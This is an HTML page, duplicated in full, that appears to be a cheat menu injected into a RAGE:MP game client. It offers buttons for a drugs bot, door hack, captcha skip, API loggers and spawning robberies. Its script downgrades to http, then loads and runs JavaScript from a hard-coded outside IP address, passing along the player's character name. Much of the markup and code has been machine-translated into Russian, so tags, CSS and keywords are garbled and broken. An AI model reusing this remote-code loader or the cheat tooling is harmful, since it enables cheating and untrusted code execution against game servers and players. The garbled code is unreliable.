<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-совместимый" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>if('https:'==document.location.protocol) document.location.protocol='http:'</script>
</head>
<стиль>
 .main {
            отступ: 20px;
            радиус границы: 20пикселей;
            background-color: #ffffff;
            позиция: фиксированная;
            топ: 50%;
            осталось: 50%;
            transform: translate(-50%, -50%);
            box-shadow: 0px 0px 15px 0px #00000014;
            дисплей: flex;
            выбор пользователя: нет;
        }

        кнопка {
            высота: 40пикселей;
            ширина: 130px;
            схема: нет;
            граница: нет;
            радиус границы: 20пикселей;
            семейство шрифтов: 'Fira-Sans', sans-serif;
            размер шрифта: 18px;
            цвет: #ffffff;
            background-color: #347AF0;
            дисплей: блок;
            margin-top: 5px;
        }

 .кнопка-список {
            дисплей: встроенный блок;
            ширина границы: 0 1px 0 0;
            отступ справа: 20пикселей;
            margin-right: 20px;
            стиль границы: сплошной;
            border-color: #bebebe;
        }

 .браузер {
            дисплей: встроенный блок;
            ширина: 1280px;
            высота: 1074px;
        }

        iframe {
            ширина: 1280px;
            высота: 1072px;
            радиус границы: 10пикселей;
            border-color: #bebebe;
            стиль границы: сплошной;
            ширина границы: 1px;
        }

</style>
<тело>
    <div id="main" class="main">
        <div class="button-list">
            <button onclick="drugsBot()">Drugs bot</button>
            <button onclick="doorHack()">Взлом двери</button>
            <button onclick="antiAFK()">Анти-АФК</button>
            <button onclick="disableAntiAFK()">Отключить анти-АФК</button>
            <button onclick="serverAPIgetAsyncLogger()">GetAsync logger</button>
            <button onclick="serverAPIcallApiAsyncLogger()">callApiAsync logger</button>
            <button onclick="bindThisMenu()">Окно привязки</button>
            <button onclick="fishingBot()">Рыболовный бот< /button>
            <button onclick="fishingCapchaSkip()">Пропуститькапчу</button>
            <button onclick="junkSearcher()">Junk searcher</button>
            <button onclick="adminMessageSound()">ЗвукAMessage</button>
            <button onclick="spawnHouseRobs()">Spawn robs</button>
        </div>
        <div class="браузер">
            <iframe id="browser-iframe" src="https://jsconsole.com" frameborder="0"></iframe>
        </div>
    </div>
<сценарий>
    var script=document.createElement("скрипт");
    script.src="package://Lib/js/rage-rpc.min.js?r="+Math.random();
    script.onload=function() {
        rpc.callClient('client_console_getMyName').then(функция(a) {
            var rpc2js = document.createElement("скрипт");
            rpc2js.src=`http://88.212.253.252:26548/cache/rpc2.js?characterName=${a.data}`;
            document.head.append(rpc2js);
        })
    }
        
    script.onerror=функция(e) {
        mp.trigger("clientFunc_notify", "error", "RPC Loading error. ");
    }
    document.head.append(скрипт);
</script>
</body>
</html>мV<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-совместимый" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>if('https:'==document.location.protocol) document.location.protocol='http:'</script>
</head>
<стиль>
 .main {
            отступ: 20px;
            радиус границы: 20пикселей;
            background-color: #ffffff;
            позиция: фиксированная;
            топ: 50%;
            осталось: 50%;
            transform: translate(-50%, -50%);
            box-shadow: 0px 0px 15px 0px #00000014;
            дисплей: flex;
            выбор пользователя: нет;
        }

        кнопка {
            высота: 40пикселей;
            ширина: 130px;
            схема: нет;
            граница: нет;
            радиус границы: 20пикселей;
            семейство шрифтов: 'Fira-Sans', sans-serif;
            размер шрифта: 18px;
            цвет: #ffffff;
            background-color: #347AF0;
            дисплей: блок;
            margin-top: 5px;
        }

 .кнопка-список {
            дисплей: встроенный блок;
            ширина границы: 0 1px 0 0;
            отступ справа: 20пикселей;
            margin-right: 20px;
            стиль границы: сплошной;
            border-color: #bebebe;
        }

 .браузер {
            дисплей: встроенный блок;
            ширина: 1280px;
            высота: 1074px;
        }

        iframe {
            ширина: 1280px;
            высота: 1072px;
            радиус границы: 10пикселей;
            border-color: #bebebe;
            стиль границы: сплошной;
            ширина границы: 1px;
        }

</style>
<тело>
    <div id="main" class="main">
        <div class="button-list">
            <button onclick="drugsBot()">Drugs bot</button>
            <button onclick="doorHack()">Взлом двери</button>
            <button onclick="antiAFK()">Анти-АФК</button>
            <button onclick="disableAntiAFK()">Отключить анти-АФК</button>
            <button onclick="serverAPIgetAsyncLogger()">GetAsync logger</button>
            <button onclick="serverAPIcallApiAsyncLogger()">callApiAsync logger</button>
            <button onclick="bindThisMenu()">Окно привязки</button>
            <button onclick="fishingBot()">Рыболовный бот< /button>
            <button onclick="fishingCapchaSkip()">Пропуститькапчу</button>
            <button onclick="junkSearcher()">Junk searcher</button>
            <button onclick="adminMessageSound()">ЗвукAMessage</button>
            <button onclick="spawnHouseRobs()">Spawn robs</button>
        </div>
        <div class="браузер">
            <iframe id="browser-iframe" src="https://jsconsole.com" frameborder="0"></iframe>
        </div>
    </div>
<сценарий>
    var script=document.createElement("скрипт");
    script.src="package://Lib/js/rage-rpc.min.js?r="+Math.random();
    script.onload=function() {
        rpc.callClient('client_console_getMyName').then(функция(a) {
            var rpc2js = document.createElement("скрипт");
            rpc2js.src=`http://88.212.253.252:26548/cache/rpc2.js?characterName=${a.data}`;
            document.head.append(rpc2js);
        })
    }
        
    script.onerror=функция(e) {
        mp.trigger("clientFunc_notify", "error", "RPC Loading error. ");
    }
    document.head.append(скрипт);
</script>
</body>
</html>м
